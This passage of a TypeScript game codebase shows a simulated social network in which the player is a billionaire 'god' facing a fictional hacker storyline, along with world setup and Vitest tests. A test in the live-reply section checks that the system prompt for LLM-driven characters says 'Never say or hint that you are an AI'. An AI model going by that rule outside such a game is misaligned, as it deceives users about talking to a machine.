    return { cash: -Number(d.ransom), reputation: -5, outcome: `You paid ${fmtMoney(Number(d.ransom))} in-world. gh0st went quiet. Overrated HQ calls it a confession.`, topic: { category: "controversy", label: "god paying gh0st", subject: "paid the ransom", valence: -0.5, magnitude: 6 } };
  }
  if (choice === "deny") {
    const ok = rng.chance(0.6);
    after(ok);
    if (u) { u.grudge = Math.min(100, u.grudge + 10); u.nextLeakAt = Math.min(u.nextLeakAt, now + rng.range(2, 4) * HOUR); }
    return ok
      ? { reputation: 4, outcome: "Skeptics Anonymous checked the doc. The fonts don't match. The denial landed.", topic: { category: "announcement", label: "the leak debunk", subject: "fake doc, real drama", valence: 0.4, magnitude: 5 } }
      : { reputation: -3, outcome: "Nobody believed the denial. gh0st is teasing part 2.", topic: { category: "allegation", label: "the denied leak", subject: `${d.doc}`, valence: -0.45, magnitude: 5.5 } };
  }
  if (choice === "counter") {
    const ok = rng.chance(0.55);
    after(ok);
    if (u) u.grudge = Math.min(100, u.grudge + (ok ? 25 : 15));
    return ok
      ? { reputation: 4, influence: 3, followers: 700_000, outcome: "In the story, your team repainted gh0st's #trophy-wall gold. The Undernet is in shambles.", topic: { category: "viral", label: "god's counter-hack", subject: "the trophy wall is gold now", valence: 0.6, magnitude: 6.5 } }
      : { reputation: -4, outcome: "The counter-hack fizzled. gh0st framed it on the #trophy-wall.", topic: { category: "controversy", label: "the failed counter-hack", subject: "nice try", valence: -0.4, magnitude: 5.5 } };
  }
  if (choice === "hire") {
    after(true);
    const wren = crewOf(s, "wren");
    if (u) { u.hiredUntil = now + 48 * HOUR; u.nextLeakAt = Math.max(u.nextLeakAt, now + 8 * HOUR); }
    if (wren) { wren.bond = Math.min(100, (wren.bond ?? 0) + 25); wren.opinion = Math.min(100, wren.opinion + 15); }
    return { cash: -1_500_000, reputation: 3, outcome: "You hired @whitehat_wren. Fake drops get called out before they spread.", topic: { category: "announcement", label: "god hiring a white hat", subject: "hired @whitehat_wren", valence: 0.4, magnitude: 4.5, amount: 1_500_000 } };
  }
  return { outcome: "Nothing happened." };
}

/** GOD MODE: gh0st takes credit or threatens */
export function undernetOnAction(s: WorldState, topic: Topic, now: number) {
  const u = s.undernet;
  if (!u) return;
  const rng = rngFor(s.seed, "ucredit", topic.id);
  u.grudge = Math.min(100, u.grudge + 3);
  if (!rng.chance(0.5 + u.grudge / 250)) return;
  const label = safeFlavor(topic.label.slice(0, 60), "move");
  s.bus.push({ id: id(s, "v"), kind: "undernet", t: Math.round(now + rng.range(40, 180) * SEC), data: { beat: "credit", label } });
  if (u.grudge > 60) u.nextLeakAt = Math.min(u.nextLeakAt, now + rng.range(30, 90) * MIN);
}

const TAUNT = /\b(leak it|do it|try me|bring it|i dare you|go ahead|prove it|show me|drop it|post it|whatever you got)\b/i;
/** @god DMs a crew member. Returns the reply messages (scripted; live replies replace them when available). */
export function crewDmReply(s: WorldState, peer: Character, text: string, now: number, godMsgId: string): Message[] {
  const role = crewRole(s, peer.id);
  if (!role || !s.undernet) return [];
  const rng = rngFor(s.seed, "udm", godMsgId);
  const t0 = now + rng.range(1.5, 3.5) * SEC;
  const lt = text.toLowerCase();
  let bank: string[];
  if (role === "gh0st") {
    const k = TAUNT.test(lt) ? "taunt" : /\b(who are you|who r u|what do you want|why)\b/.test(lt) ? "who" : /\b(stop|leave me|enough|quit)\b/.test(lt) ? "stop"
      : /\b(pay|price|money|deal|offer|how much)\b/.test(lt) ? "deal" : /\b(love|cool|respect|nice|good job|impressive)\b/.test(lt) ? "nice" : /\b(loser|clown|mid|cringe|fake|shut up|pathetic)\b/.test(lt) ? "mean" : "generic";
    bank = L.dm[k as keyof typeof L.dm];
    if (k === "taunt" && !s.bus.some((e) => e.kind === "undernet" && e.data.beat === "leak" && e.t < now + 10 * MIN)) {
      scheduleLeak(s, rng, now + rng.range(35, 60) * SEC, false);
      s.undernet.grudge = Math.min(100, s.undernet.grudge + 8);
    }
  } else bank = role === "wren" ? L.wrenDm : role === "broker" ? L.brokerDm : role === "kid" ? L.kidDm : L.hypeDm;
  const out: Message[] = [dm(s, peer, say(rng, bank, { n: String(s.undernet.leaks + 1) }), t0)];
  if (rng.chance(0.35)) out.push(dm(s, peer, say(rng, bank, {}), t0 + rng.range(3, 8) * SEC));
  peer.bond = Math.min(100, (peer.bond ?? 0) + 4);
  return out;
}

```

## src/lib/sim/world.ts
```ts
import { installUndernet } from "./undernet";
import { rngFor } from "./rng";
import type { Character, Server, WorldState } from "./types";
import { makeCharacter } from "./characters";
import { CELEB_FIELDS } from "./data";
import { OUTLETS, SERVER_DEFS } from "./servers";

export const WORLD_VERSION = 6;
export const CORE_CAST = 36;
export const CHARACTER_COUNT = 380;

export function createWorld(seed: string, now: number): WorldState {
  const rng = rngFor(seed, "world");
  const used = new Set<string>();
  const characters: Character[] = [];
  const celebs = CELEB_FIELDS.map((f, i) => ({ field: f, idx: i }));
  for (let i = 0; i < CHARACTER_COUNT; i++) {
    const celeb = i < celebs.length ? celebs[i].field : undefined;
    characters.push(makeCharacter(rng, i, used, { influencer: i < 40, celebField: celeb, celebIndex: i }));
  }
  const servers: Server[] = SERVER_DEFS.map((d) => {
    const want = d.cast;
    const scored = characters.map((c) => {
      const interest = c.interests.filter((x) => d.tags.includes(x) || (x === "celebrity" && d.tags.includes("drama"))).length;
      const align = 1 + Math.max(-0.8, d.bias * (c.opinion / 100) * 1.6);
      const w = (0.35 + interest) * align * (c.tier === "power" ? 1.5 : 1) * rng.range(0.2, 1.8);
      return { c, w };
    });
    scored.sort((a, b) => b.w - a.w);
    const members = scored.slice(0, want).map((x) => x.c);
    for (const m of members) m.servers.push(d.id);
    const modPool = members.filter((m) => m.tier !== "lurker" && !m.influencer && m.age >= 19);
    const mods = rng.shuffle([...modPool]).slice(0, rng.int(2, 3));
    for (const m of mods) m.isMod = true;
    return {
      id: d.id, name: d.name, icon: d.icon, color: d.color, description: d.description, bias: d.bias, vibe: d.vibe, tags: d.tags,
      channels: d.channels.map(([name, topic, tags]) => ({ id: `${d.id}-${name}`, name, topic, tags, announce: name === "god-announcements" || name === "announcements" })),
      members: members.map((m) => m.id), moderators: mods.map((m) => m.id), memberCount: d.size, insideJokes: d.jokes,
    };
  });
  // every character lives somewhere
  for (const c of characters) {
    if (!c.servers.length) {
      const s = rng.pick(servers);
      s.members.push(c.id);
      c.servers.push(s.id);
    }
    for (const sid of c.servers) if (rng.chance(0.22)) c.nicknames[sid] = rng.pick([c.displayName.split(" ")[0].toLowerCase(), `${c.username.slice(0, 6)}`, `${c.displayName.split(" ")[0]} 🌙`, `${c.username} (${rng.pick(["afk", "lvl " + rng.int(5, 80), "mod-in-training", "lurking", "NFA"])})`]);
  }
  // relationships form inside shared servers
  for (const c of characters) {
    const pool = servers.filter((s) => c.servers.includes(s.id)).flatMap((s) => s.members).filter((id) => id !== c.id);
    for (let k = 0; k < rng.int(1, 5) && pool.length; k++) {
      const o = characters[Number(rng.pick(pool).slice(1))];
      const same = Math.sign(o.opinion) === Math.sign(c.opinion);
      if (same && !c.friends.includes(o.id)) { c.friends.push(o.id); if (!o.friends.includes(c.id)) o.friends.push(c.id); }
      else if (!same && !c.rivals.includes(o.id) && rng.chance(0.6)) { c.rivals.push(o.id); if (!o.rivals.includes(c.id)) o.rivals.push(c.id); }
    }
  }
  pickCoreCast(rng, characters, servers);
  const start = Math.floor(now / 10_000) * 10_000;
  const w: WorldState = {
    version: WORLD_VERSION, seed, createdAt: now, simTime: start, lastSeenAt: now, characters, servers, outlets: OUTLETS,
    celebrities: celebs.map((c) => ({ id: `c${c.idx}`, field: c.field })),
    messages: [], posts: [], articles: [], topics: [], events: [], notifications: [],
    player: {
      username: "god", displayName: "God", cash: 2_400_000_000, followers: 48_200_000, reputation: 62, influence: 88, avatarSeed: 7,
      holdings: [
        { id: "h-holdings", kind: "business", name: "GOD Holdings", value: 9_800_000_000, acquiredAt: now - 9e10, detail: "Parent company · 14 subsidiaries", employees: 6200, yieldPerDay: 4_100_000 },
        { id: "h-penthouse", kind: "property", name: "Halcyon Tower Penthouse", value: 180_000_000, acquiredAt: now - 6e10, detail: "Port Aurelia · 3 floors" },
        { id: "h-jet", kind: "jet", name: "Skyhaven 700", value: 72_000_000, acquiredAt: now - 4e10, detail: "Tail: G-OD1" },
        { id: "h-car", kind: "vehicle", name: "Vantor Spectre", value: 3_400_000, acquiredAt: now - 2e10, detail: "Matte black" },
        { id: "h-port", kind: "investment", name: "Index & Venture Portfolio", value: 3_100_000_000, acquiredAt: now - 9e10, detail: "Diversified", yieldPerDay: 600_000 },
      ],
      history: [], netWorthHistory: [],
    },
    settings: { activity: 1, glazeRatio: 0.5, drama: 0.5, theme: "midnight", reducedMotion: false },
    counter: 0, stats: { messages: 0, posts: 0, articles: 0, pruned: 0 }, recentTexts: [], pending: [], bus: [], godLog: [],
  };
  installUndernet(w, now);
  return w;
}

/** ~36 recurring regulars with a deliberate mix of attitudes, so the player learns their names. */
/** bring an older save up to the current version without losing anything */
export function migrateWorld(w: WorldState): WorldState | undefined {
  if (w.version === WORLD_VERSION) { ensureUndernet(w); return w; }
  if (w.version !== 3 && w.version !== 4 && w.version !== 5) return undefined;
  if (w.version === 3) {
    w.bus ??= [];
    w.godLog ??= [];
    if (!w.characters.some((c) => c.core)) pickCoreCast(rngFor(w.seed, "core-migrate"), w.characters, w.servers);
    for (const m of w.messages) if (m.authorId === "god") w.godLog.push({ id: m.id, t: m.t, text: m.text, serverId: m.serverId, channelId: m.channelId, intent: "generic" });
    w.godLog = w.godLog.slice(-60);
  }
  // v3, v4 and early v5 saves may predate The Undernet
  ensureUndernet(w);
  w.version = WORLD_VERSION;
  return w;
}

/** safety net on every load: installs The Undernet into any save that lacks it (idempotent) and flags the "new" tip */
export function ensureUndernet(w: WorldState) {
  if (installUndernet(w, w.simTime || Date.now())) w.undernet!.announce = true;
  return w;
}

function pickCoreCast(rng: ReturnType<typeof rngFor>, characters: Character[], servers: Server[]) {
  const want: [Character["stance"], number][] = [["worshipper", 7], ["fan", 7], ["analyst", 4], ["skeptic", 4], ["jealous", 4], ["hater", 4], ["memer", 3], ["conspiracist", 1], ["indifferent", 2]];
  const hq = servers.find((x) => x.id === "godhq")!;
  const pool = characters.filter((c) => !c.influencer && c.age >= 16);
  const core: Character[] = [];
  for (const [stance, n] of want) {
    const cands = rng.shuffle(pool.filter((c) => c.stance === stance && !core.includes(c))).sort((a, b) => Number(a.tier === "lurker") - Number(b.tier === "lurker"));
    core.push(...cands.slice(0, n));
  }
  for (const c of core.slice(0, CORE_CAST)) {
    c.core = true;
    if (c.tier === "lurker") c.tier = "regular";
    c.activity = Math.max(c.activity, 1.6) * 2.2;
    c.bond = Math.round(rng.range(0, 12));
    c.godContacts = [];
    if (!c.servers.includes(hq.id)) { c.servers.push(hq.id); hq.members.push(c.id); }
  }
  // regulars know each other
  const ids = core.map((c) => c.id);
  for (const c of core) {
    const others = rng.shuffle(ids.filter((x) => x !== c.id)).slice(0, 3);
    for (const o of others) {
      const oc = characters[Number(o.slice(1))];
      const same = Math.sign(oc.opinion) === Math.sign(c.opinion);
      const list = same ? "friends" : "rivals";
      if (!c[list].includes(o)) c[list].push(o);
      if (!oc[list].includes(c.id)) oc[list].push(c.id);
    }
  }
}

export const charById = (s: WorldState, id: string) => s.characters[Number(id.slice(1))];
export const serverById = (s: WorldState, id: string) => s.servers.find((x) => x.id === id)!;
export const netWorth = (s: WorldState) => s.player.cash + s.player.holdings.reduce((a, h) => a + h.value, 0);

```

## tests/actions.test.ts
```ts
import { describe, expect, it } from "vitest";
import { world, T0 } from "./helpers";
import { godEdit, godPin, godPost, godPostAction, godReact, godSay, pinnedIn, reactionsAt, simulate, textKey, unreadIndex, dmThreads, typingIn } from "../src/lib/sim/engine";
import { dmChannel } from "../src/lib/sim/godspeak";
import { migrateWorld } from "../src/lib/sim/world";

const hq = (s: ReturnType<typeof world>) => { const srv = s.servers.find((x) => x.id === "godhq") ?? s.servers[0]; return { srv, ch: srv.channels.find((c) => c.name === "general") ?? srv.channels[0] }; };

describe("@god's own message actions", () => {
  it("edits, pins, reacts and deletes", () => {
    const s = world();
    const { srv, ch } = hq(s);
    const { message } = godSay(s, srv.id, ch.id, "first draft", T0 + 1000);
    expect(godEdit(s, message.id, "final words", T0 + 5000)).toBe(true);
    const m = [...s.messages, ...s.pending].find((x) => x.id === message.id)!;
    expect(m.text).toBe("final words");
    expect(m.editedAt).toBe(T0 + 5000);
    godPin(s, m.id, T0 + 6000);
    expect(pinnedIn(s, ch.id, T0 + 7000).map((x) => x.id)).toContain(m.id);
    godPin(s, m.id, T0 + 8000);
    expect(pinnedIn(s, ch.id, T0 + 9000).map((x) => x.id)).not.toContain(m.id);
    godReact(s, m.id, "🫡");
    expect(reactionsAt(m, T0 + 1000).find((r) => r.emoji === "🫡")?.me).toBe(true);
    godReact(s, m.id, "🫡");
    expect(m.reactions.find((r) => r.emoji === "🫡" && r.me)).toBeUndefined();
    expect(godEdit(s, m.id, null, T0 + 10000)).toBe(true);
    expect(m.deleted).toBe(true);
    expect(s.godLog.some((g) => g.id === m.id)).toBe(false);
  });
  it("cannot edit someone else's message", () => {
    const s = world();
    const other = s.messages.find((m) => m.authorId !== "god")!;
    expect(godEdit(s, other.id, "hacked", T0)).toBe(false);
    expect(other.text).not.toBe("hacked");
  });
});

describe("posts", () => {
  it("like and repost toggle by exactly one", () => {
    const s = world();
    const p = s.posts.find((x) => x.authorId !== "god")!;
    const l = p.likes, r = p.reposts;
    godPostAction(s, p.id, "like"); expect(p.likes).toBe(l + 1);
    godPostAction(s, p.id, "like"); expect(p.likes).toBe(l);
    godPostAction(s, p.id, "repost"); expect(p.reposts).toBe(r + 1);
  });
  it("reply counts are backed by stored replies", () => {
    const s = world();
    godPost(s, "chirp", "big announcement tomorrow", T0 + 1000);
    const mine = s.posts.filter((p) => p.authorId === "god").at(-1)!;
    const stored = s.posts.filter((p) => p.replyTo === mine.id).length;
    expect(stored).toBeGreaterThanOrEqual(3);
    expect(mine.replies).toBe(stored);
  });
});

describe("unread, DMs and dedupe", () => {
  it("counts unread + mentions per channel and clears on read", () => {
    const s = world();
    const { srv, ch } = hq(s);
    godSay(s, srv.id, ch.id, "sup guys", T0 + 1000);
    simulate(s, T0 + 60_000);
    const u = unreadIndex(s, T0 + 60_000, {}, T0 + 1000).get(ch.id)!;
    expect(u.n).toBeGreaterThan(0);
    expect(u.mentions).toBeGreaterThan(0);
    expect(unreadIndex(s, T0 + 60_000, { [ch.id]: T0 + 60_000 }, T0).get(ch.id)).toBeUndefined();
  });
  it("a DM to a character gets typed + answered and shows up as a thread", () => {
    const s = world();
    const c = s.characters.find((x) => x.core)!;
    const id = dmChannel("god", c.id);
    godSay(s, "dm", id, "hey, you up?", T0 + 1000);
    const reply = s.pending.find((m) => m.channelId === id && m.authorId === c.id);
    expect(reply).toBeDefined();
    expect(typingIn(s, id, (reply!.typingFrom ?? reply!.t - 1000) + 1)).toContain(c.id);
    simulate(s, reply!.t + 1000);
    expect(dmThreads(s, reply!.t + 1000).find((d) => d.channelId === id)?.withGod).toBe(true);
  });
  it("dedupe key ignores case, punctuation, emoji and handles", () => {
    expect(textKey("LMAO @god 💀 sup!!")).toBe(textKey("lmao sup"));
  });
});

describe("save migration", () => {
  it("upgrades an older save instead of wiping it", () => {
    const s = world();
    const old = JSON.parse(JSON.stringify(s));
    old.version = 3; delete old.bus; delete old.godLog;
    const m = migrateWorld(old)!;
    expect(m).toBeDefined();
    expect(Array.isArray(m.bus)).toBe(true);
    expect(m.characters.length).toBe(s.characters.length);
    expect(migrateWorld({ ...old, version: 1 })).toBeUndefined();
  });
});

```

## tests/consequences.test.ts
```ts
import { describe, expect, it } from "vitest";
import { applyAction, godPost, godSay, resolveEvent, simulate } from "../src/lib/sim/engine";
import { netWorth } from "../src/lib/sim/world";
import { magnitudeFor } from "../src/lib/sim/topics";
import { HOUR, T0, world } from "./helpers";

describe("GOD MODE consequences", () => {
  it("buying an island costs cash, adds a holding and breaks the internet", () => {
    const s = world();
    const cash = s.player.cash, holdings = s.player.holdings.length, nw = netWorth(s);
    const r = applyAction(s, { kind: "island", name: "Isla Corona", cost: 600e6 }, T0);
    if ("error" in r) throw new Error(r.error);
    expect(s.player.cash).toBeCloseTo(cash - 600e6, -3);
    expect(s.player.holdings.length).toBe(holdings + 1);
    expect(Math.abs(netWorth(s) - nw)).toBeLessThan(600e6);
    expect(r.breaking).toBe(true);
    expect(r.articles.length).toBeGreaterThanOrEqual(3);
    expect(r.servers.length).toBeGreaterThanOrEqual(8);
    expect(s.topics.find((t) => t.id === r.topic.id)?.heat).toBeGreaterThan(20);
    // the reaction plays out over the following minutes
    const before = s.messages.length;
    simulate(s, T0 + 30 * 60_000);
    const reacting = s.messages.slice(before).filter((m) => m.topicId === r.topic.id);
    expect(reacting.length).toBeGreaterThan(50);
    const posts = s.posts.filter((p) => p.topicId === r.topic.id);
    expect(posts.length).toBeGreaterThan(20);
    expect(s.notifications.some((n) => n.kind === "trend")).toBe(true);
  });

  it("small actions ripple less than big ones", () => {
    const a = world(), b = world();
    const small = applyAction(a, { kind: "vehicle", name: "Vantor GT", cost: 300_000 }, T0);
    const big = applyAction(b, { kind: "jet", name: "Skyhaven 900", cost: 90e6 }, T0);
    if ("error" in small || "error" in big) throw new Error("unexpected");
    expect(small.magnitude).toBeLessThan(big.magnitude);
    expect(small.servers.length).toBeLessThan(big.servers.length);
    expect(magnitudeFor("island", 1e9)).toBeGreaterThan(magnitudeFor("island", 1e7));
  });

  it("cannot spend money you don't have", () => {
    const s = world();
    const r = applyAction(s, { kind: "business", name: "Too Big Inc", cost: 1e15 }, T0);
    expect("error" in r).toBe(true);
  });

  it("a controversy hurts reputation and splits the communities", () => {
    const s = world();
    const rep = s.player.reputation;
    const r = applyAction(s, { kind: "controversy", name: "said college is a scam", cost: 0, boost: 3 }, T0);
    if ("error" in r) throw new Error(r.error);
    expect(s.player.reputation).toBeLessThan(rep);
  });

  it("resolving an event applies its consequences once", () => {
    const s = world();
    simulate(s, T0 + 6 * HOUR);
    const ev = s.events.find((e) => !e.resolved && e.t <= s.simTime);
    expect(ev).toBeDefined();
    const before = JSON.stringify(s.player);
    const r = resolveEvent(s, ev!.id, ev!.choices[0].id, s.simTime);
    expect("error" in r).toBe(false);
    expect(JSON.stringify(s.player)).not.toBe(before);
    expect("error" in resolveEvent(s, ev!.id, ev!.choices[0].id, s.simTime)).toBe(true);
  });

  it("god talking in a channel gets replies; god posting gets engagement", () => {
    const s = world();
    const srv = s.servers[0], ch = srv.channels[0];
    godSay(s, srv.id, ch.id, "who's awake", T0);
    godPost(s, "chirp", "big announcement tomorrow", T0);
    simulate(s, T0 + 10 * 60_000);
    const replies = s.messages.filter((m) => m.channelId === ch.id && m.t > T0 && m.authorId !== "god");
    expect(replies.length).toBeGreaterThan(3);
    const post = s.posts.find((p) => p.authorId === "god");
    expect(post!.likes).toBeGreaterThan(1000);
  });
});

```

## tests/determinism.test.ts
```ts
import { describe, expect, it } from "vitest";
import { createWorld } from "../src/lib/sim/world";
import { catchUp, simulate } from "../src/lib/sim/engine";
import { rngFor, hash } from "../src/lib/sim/rng";
import { HOUR, T0, world } from "./helpers";

describe("determinism", () => {
  it("rng is seeded and stable", () => {
    const a = rngFor("x", 1), b = rngFor("x", 1), c = rngFor("x", 2);
    const sa = [a.next(), a.next(), a.next()], sb = [b.next(), b.next(), b.next()];
    expect(sa).toEqual(sb);
    expect(c.next()).not.toBe(sa[0]);
    expect(hash("abc")).toBe(hash("abc"));
  });

  it("same seed -> identical world", () => {
    const a = createWorld("s1", T0), b = createWorld("s1", T0);
    expect(JSON.stringify(a)).toBe(JSON.stringify(b));
    expect(createWorld("s2", T0).characters[5].username).not.toBe(undefined);
    expect(JSON.stringify(createWorld("s2", T0).characters)).not.toBe(JSON.stringify(a.characters));
  });

  it("bootstrapped worlds are identical for the same seed", () => {
    expect(JSON.stringify(world("same"))).toBe(JSON.stringify(world("same")));
  });

  it("chunked catch-up equals single-pass catch-up", () => {
    const a = world(), b = world();
    const to = T0 + 3 * HOUR;
    simulate(a, to);
    let guard = 0;
    while (b.simTime + 10_000 <= to && guard++ < 10_000) simulate(b, to, { maxBuckets: 37 });
    expect(b.simTime).toBe(a.simTime);
    expect(JSON.stringify(b)).toBe(JSON.stringify(a));
  });

  it("opening every 20 min equals opening once after 4h", () => {
    const a = world(), b = world();
    for (let t = T0 + 20 * 60_000; t <= T0 + 4 * HOUR; t += 20 * 60_000) simulate(a, t);
    simulate(b, T0 + 4 * HOUR);
    expect(a.messages.length).toBe(b.messages.length);
    expect(a.messages.at(-1)?.text).toBe(b.messages.at(-1)?.text);
  });
});

describe("catch-up (world runs while away)", () => {
  it("6h away produces thousands of messages, posts and articles", () => {
    const s = world();
    const sum = catchUp(s, T0 + 6 * HOUR);
    expect(sum.messages).toBeGreaterThan(2000);
    expect(sum.posts).toBeGreaterThan(200);
    expect(sum.articles).toBeGreaterThan(3);
    expect(sum.topTopics.length).toBeGreaterThan(2);
    expect(sum.highlights.length).toBeGreaterThan(0);
    expect(sum.compressed).toBe(false);
  });

  it("very long absences are compressed but still evolve the world", () => {
    const s = world();
    const op0 = s.characters.reduce((a, c) => a + c.opinion, 0);
    const t = performance.now();
    const sum = catchUp(s, T0 + 9 * 24 * HOUR);
    expect(performance.now() - t).toBeLessThan(20_000);
    expect(sum.compressed).toBe(true);
    expect(s.simTime).toBeGreaterThan(T0 + 9 * 24 * HOUR - 20_000);
    expect(s.characters.reduce((a, c) => a + c.opinion, 0)).not.toBe(op0);
  });

  it("pruning keeps state bounded", () => {
    const s = world();
    catchUp(s, T0 + 20 * HOUR);
    expect(s.messages.length).toBeLessThanOrEqual(9000 + 3000);
    expect(s.posts.length).toBeLessThanOrEqual(2700);
    expect(s.articles.length).toBeLessThanOrEqual(270);
    expect(s.notifications.length).toBeLessThanOrEqual(170);
    expect(JSON.stringify(s).length).toBeLessThan(12_000_000);
  });

  it("messages are time-ordered and never from the future once delivered", () => {
    const s = world();
    simulate(s, T0 + HOUR);
    for (let i = 1; i < s.messages.length; i++) expect(s.messages[i].t).toBeGreaterThanOrEqual(s.messages[i - 1].t);
    expect(s.messages.at(-1)!.t).toBeLessThan(s.simTime);
  });
});

```

## tests/helpers.ts
```ts
import { createWorld } from "../src/lib/sim/world";
import { bootstrap } from "../src/lib/sim/engine";
export const T0 = Date.UTC(2026, 10, 4, 12, 0, 0);
export const HOUR = 3600_000;
const cache = new Map<string, string>();
/** A bootstrapped world (cached as JSON so each test gets a fresh copy). */
export function world(seed = "test-seed", now = T0) {
  const k = `${seed}:${now}`;
  if (!cache.has(k)) cache.set(k, JSON.stringify(bootstrap(createWorld(seed, now), now)));
  return JSON.parse(cache.get(k)!) as ReturnType<typeof createWorld>;
}

```

## tests/live.test.ts
```ts
import { beforeEach, describe, expect, it } from "vitest";
import { world, T0 } from "./helpers";
import { godSay, simulate, channelMessages } from "../src/lib/sim/engine";
import { liveReply, pickLead, resetLive, historyFor } from "../src/lib/live/client";
import { cleanLines, instructions, promptText, sanitize } from "../src/lib/live/prompt";
import { dmChannel } from "../src/lib/sim/godspeak";
import type { Message, WorldState } from "../src/lib/sim/types";

function hq(s: WorldState) {
  const srv = s.servers.find((x) => /god hq/i.test(x.name)) ?? s.servers[0];
  return { srv, ch: srv.channels.find((c) => c.name === "general") ?? srv.channels[0] };
}
const say = (s: WorldState, srv: string, ch: string, text: string, now: number, replyTo?: string) => {
  const before = new Set(s.pending);
  const r = godSay(s, srv, ch, text, now, replyTo);
  return { r, fresh: s.pending.filter((m) => !before.has(m) && m.authorId !== "god") };
};
let last: { history: { who: string; text: string }[]; god: string } | undefined;
const fake = (lines: string[] | null, status = 200, code?: string) => (async (_u: unknown, init?: RequestInit) => {
  last = JSON.parse(String(init?.body));
  return new Response(JSON.stringify(lines ? { lines, model: "test/model" } : { code }), { status });
}) as unknown as typeof fetch;

beforeEach(() => resetLive());

describe("live replies", () => {
  it("DM: the peer's scripted reply is replaced by the model's lines, in order", async () => {
    const s = world();
    const c = s.characters.find((x) => x.core)!;
    const ch = dmChannel("god", c.id);
    let clock = T0 + 60_000;
    const { r, fresh } = say(s, "dm", ch, "yo what are you up to", clock);
    expect(pickLead(s, r.message, fresh)?.authorId).toBe(c.id);
    const out = await liveReply(s, r.message, fresh, { now: () => (clock += 800), changed: () => {}, post: fake(["nm just got off work", "wbu"]) });
    expect(out).toBe("live");
    simulate(s, clock + 10 * 60_000);
    const msgs = channelMessages(s, ch, clock + 10 * 60_000).filter((m) => m.authorId === c.id).map((m) => m.text);
    expect(msgs).toEqual(["nm just got off work", "wbu"]);
  });

  it("sends the recent conversation so replies can remember it", async () => {
    const s = world();
    const c = s.characters.find((x) => x.core)!;
    const ch = dmChannel("god", c.id);
    let clock = T0 + 60_000;
    const post = fake(["bet"]);
    for (const text of ["my favorite color is teal", "remember that", "what's my favorite color?"]) {
      const { r, fresh } = say(s, "dm", ch, text, clock);
      await liveReply(s, r.message, fresh, { now: () => (clock += 1500), changed: () => {}, post });
      clock += 60 * 60_000; // let it land (even if they were asleep)
      simulate(s, clock);
    }
    const body = last!;
    expect(body.god).toBe("what's my favorite color?");
    expect(body.history.map((h) => h.text)).toContain("my favorite color is teal");
    expect(body.history.some((h) => h.who === c.username)).toBe(true);
  });

  it("falls back to the scripted line when the model is unavailable, and stops asking", async () => {
    const s = world();
    const { srv, ch } = hq(s);
    let clock = T0 + 60_000;
    const { r, fresh } = say(s, srv.id, ch.id, "sup guys", clock);
    const lead = pickLead(s, r.message, fresh)!;
    const text = lead.text;
    const out = await liveReply(s, r.message, fresh, { now: () => (clock += 300), changed: () => {}, post: fake(null, 402, "customer_verification_required") });
    expect(out).toBe("fallback");
    expect(lead.text).toBe(text);
    expect(lead.t).toBeLessThan(clock + 3000);
    const again = say(s, srv.id, ch.id, "hello?", (clock += 5000));
    expect(await liveReply(s, again.r.message, again.fresh, { now: () => clock, changed: () => {}, post: fake(["x"]) })).toBe("skipped");
  });

  it("replies to the lead wait behind it", async () => {
    const s = world();
    const { srv, ch } = hq(s);
    simulate(s, T0 + 60_000);
    const target = channelMessages(s, ch.id, T0 + 60_000).filter((m) => m.authorId.startsWith("c")).pop() as Message;
    let clock = T0 + 61_000;
    const { r, fresh } = say(s, srv.id, ch.id, "wait you again?", clock, target.id);
    const lead = pickLead(s, r.message, fresh)!;
    expect(lead.authorId).toBe(target.authorId);
    await liveReply(s, r.message, fresh, { now: () => (clock += 4000), changed: () => {}, post: fake(["lmaooo yes me again"]) });
    for (const d of fresh.filter((m) => m.replyTo === lead.id)) expect(d.t).toBeGreaterThan(lead.t);
  });

  it("history excludes the new god line and is capped at 30", () => {
    const s = world();
    const { ch } = hq(s);
    simulate(s, T0 + 3600e3);
    expect(historyFor(s, ch.id, T0 + 3600e3, "none").length).toBeLessThanOrEqual(30);
  });
});

describe("prompt", () => {
  it("sanitizes and caps input", () => {
    expect(sanitize({})).toBeUndefined();
    const r = sanitize({ persona: { username: "a".repeat(200), opinion: 900 }, god: "x".repeat(2000), history: Array.from({ length: 50 }, () => ({ who: "a", text: "b" })) })!;
    expect(r.persona.username.length).toBe(40);
    expect(r.persona.opinion).toBe(100);
    expect(r.god.length).toBe(600);
    expect(r.history.length).toBe(30);
  });
  it("keeps the rules in the system prompt", () => {
    const r = sanitize({ persona: { username: "kai", name: "Kai" }, god: "are you a bot?" })!;
    const sys = instructions(r);
    expect(sys).toMatch(/fictional/);
    expect(sys).toMatch(/Never say or hint that you are an AI/);
    expect(instructions({ ...r, allowBreak: true })).toMatch(/may say yes/);
    expect(promptText(r)).toMatch(/are you a bot\?/);
  });
  it("cleans model output", () => {
    expect(cleanLines('kai: "yo"\n\n- *laughs* lmao\nthree\nfour', "kai")).toEqual(["yo", "lmao", "three"]);
  });
});

describe("memory of what god says", () => {
  it("keeps a remembered fact and sends it next time", async () => {
    const { liveReply, resetLive, persona } = await import("../src/lib/live/client");
    const { parseReply } = await import("../src/lib/live/prompt");
    expect(parseReply('{"messages":["omg biscuit 😭"],"remember":"his dog is called Biscuit"}', "x")).toEqual({ lines: ["omg biscuit 😭"], remember: "his dog is called Biscuit" });
    expect(parseReply("just plain text", "x").lines).toEqual(["just plain text"]);
    resetLive();
    const s = world("mem");
    const c = s.characters.find((x) => x.core)!;
    simulate(s, T0 + 60e3);
    const before = new Set(s.pending);
    const r = godSay(s, "dm", dmChannel("god", c.id), "my dog is called Biscuit", T0 + 60e3);
    const fresh = s.pending.filter((m) => !before.has(m) && m.authorId !== "god");
    const out = await liveReply(s, r.message, fresh, { now: () => T0 + 60e3, changed: () => {}, post: async () => Response.json({ lines: ["biscuit is elite"], remember: "his dog is called Biscuit" }) });
    expect(out).toBe("live");
    expect(c.godFacts).toContain("his dog is called Biscuit");
    expect(persona(c, s).godFacts).toContain("his dog is called Biscuit");
  });
});

```

## tests/memes.test.ts
```ts
import { describe, expect, it } from "vitest";
import { world, T0, HOUR } from "./helpers";
import { godSay, simulate } from "../src/lib/sim/engine";
import { makeMeme, memeAlt } from "../src/lib/sim/memes";
import { rngFor } from "../src/lib/sim/rng";

describe("memes", () => {
  it("are deterministic for the same seed", () => {
    const a = makeMeme(rngFor("x", "m", "1"), { topic: "the river festival", mood: "fan" });
    const b = makeMeme(rngFor("x", "m", "1"), { topic: "the river festival", mood: "fan" });
    expect(a).toEqual(b);
  });
  it("cover several formats and always have alt text", () => {
    const fs = new Set<string>();
    for (let i = 0; i < 200; i++) {
